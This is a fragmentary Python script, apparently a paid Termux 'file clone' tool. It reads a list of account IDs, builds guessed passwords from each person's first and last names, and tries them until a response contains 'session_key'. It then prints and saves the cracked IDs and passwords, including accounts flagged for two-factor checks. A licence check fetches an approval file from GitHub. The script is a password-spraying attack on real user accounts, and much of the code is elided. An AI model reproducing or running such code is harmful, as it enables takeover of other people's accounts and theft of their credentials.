...
twf = []
loop = 0
os.system('https://wa.me/message/PX3KDZ7Q6S4DM1')
...
[\033[1;96m╚═════╝  ╚═════╝ ╚══════╝╚══════╝
 ...
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [\033[1;91m✓\033[1;92m] AUTHOR    \033[1;91m: \033[1;92mK3SHAV_XD         ┃
 ┃ [\033[1;91m✓\033[1;92m] TOOL      \033[1;91m: \033[1;92mFILE CLONE               ┃
 ┃ [\033[1;91m✓\033[1;92m] STATUS    \033[1;91m: \033[1;92m--(PAID)                      ┃
 ┃ [\033[1;91m✓\033[1;92m] SYSTEM    \033[1;91m: \033[1;92m/DATA & WIFI/                ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
""""")
def linex():
    print('\033[1;37m---------------------------')
...
def chk(): 
  ...
  try: 
    httpCaht = requests.get('https://github.com/boss92-lang/BOSS_KING/blob/main/Approval.txt').text 
    if id in httpCaht: 
...
def menu():
    ...
    if lomda in ['1']:
        clear()
        print('PUT FILE EXAMPLE :  /sdcard/Boss.txt')
        linex()
        ...
        linex()
        clear()
        print('\033[1;37m EXAMPLE : -->[first last,>firtslast First123~First321')
        linex()
...
def ffb(ids,names,passlist):
        try:
                global oks,loop
                sys.stdout.write('\r\r\033[1;37m [BOSS-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        break
                                                ...
                                                print('\r\r \033[1;35m[Boss[🤢]-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
